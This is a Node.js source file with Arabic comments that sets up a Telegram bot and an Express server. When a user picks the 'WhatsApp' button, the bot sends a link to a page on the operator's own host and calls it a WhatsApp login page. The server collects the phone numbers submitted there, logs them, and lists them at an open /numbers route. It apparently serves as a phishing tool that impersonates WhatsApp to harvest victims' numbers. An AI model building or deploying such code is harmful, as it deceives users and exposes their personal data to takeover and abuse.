const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const app = express();

// 🔑 ضع توكن البوت هنا
const token = process.env.BOT_TOKEN || 'YOUR_BOT_TOKEN_HERE';
const bot = new TelegramBot(token, { polling: true });

// لتخزين الأرقام مؤقتاً
let receivedNumbers = [];

// خدمة الملفات الثابتة
app.use(express.static('public'));
app.use(express.json());

// 🎯 معالجة أمر /start
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const keyboard = {
        reply_markup: {
            inline_keyboard: [
                [{ text: "📱 وتساب", callback_data: "whatsapp" }],
                [{ text: "🔢 11", callback_data: "option_11" }],
                [{ text: "🔢 22", callback_data: "option_22" }]
            ]
        }
    };
    
    bot.sendMessage(chatId, "مرحباً! 👋 اختر أحد الخيارات:", keyboard);
});

// 🔘 معالجة الضغط على الأزرار
bot.on('callback_query', (query) => {
    const chatId = query.message.chat.id;
    
    if (query.data === 'whatsapp') {
        // استخدام رابط Render الثابت
        const websiteUrl = process.env.RENDER_EXTERNAL_URL || "https://whatsapp-bot.onrender.com";
        
        bot.sendMessage(chatId, 
            `📱 **لتسجيل الدخول إلى WhatsApp**\n\n` +
            `🔗 اضغط على الرابط التالي:\n` +
            `${websiteUrl}\n\n` +
            `سيتم فتح صفحة تسجيل الدخول`,
            { parse_mode: 'Markdown' }
        );
        
    } else if (query.data === 'option_11') {
        bot.sendMessage(chatId, "✅ اخترت الخيار 11");
    } else if (query.data === 'option_22') {
        bot.sendMessage(chatId, "✅ اخترت الخيار 22");
    }
});

// 📍 راوت لاستقبال الأرقام من الموقع
app.post('/submit-phone', (req, res) => {
    const { phone } = req.body;
    
    if (phone && /^[\d]{8,15}$/.test(phone)) {
        // حفظ الرقم
        receivedNumbers.push({
            phone: phone,
            timestamp: new Date().toLocaleString('ar-SA')
        });
        
        // طباعة الرقم في السجلات
        console.log('📱 ===== رقم جديد من الموقع =====');
        console.log('📞 الرقم:', phone);
        console.log('📅 الوقت:', new Date().toLocaleString('ar-SA'));
        console.log('📱 ===========================');
        
        res.json({ 
            success: true, 
            message: 'تم استلام رقمك بنجاح!' 
        });
    } else {
        res.json({ 
            success: false, 
            message: 'رقم غير صحيح' 
        });
    }
});

// 📊 راوت لعرض الأرقام المستلمة
app.get('/numbers', (req, res) => {
    res.json(receivedNumbers);
});

// 🏠 الصفحة الرئيسية - تخدم ملف index.html من مجلد public
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/public/index.html');
});

// 🚀 تشغيل السيرفر
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log('🚀 ===========================');
    console.log('🤖 بوت WhatsApp يعمل بنجاح!');
    console.log('📡 البورت:', PORT);
    console.log('🌐 جاهز لاستقبال الأرقام');
    console.log('🚀 ===========================');
});
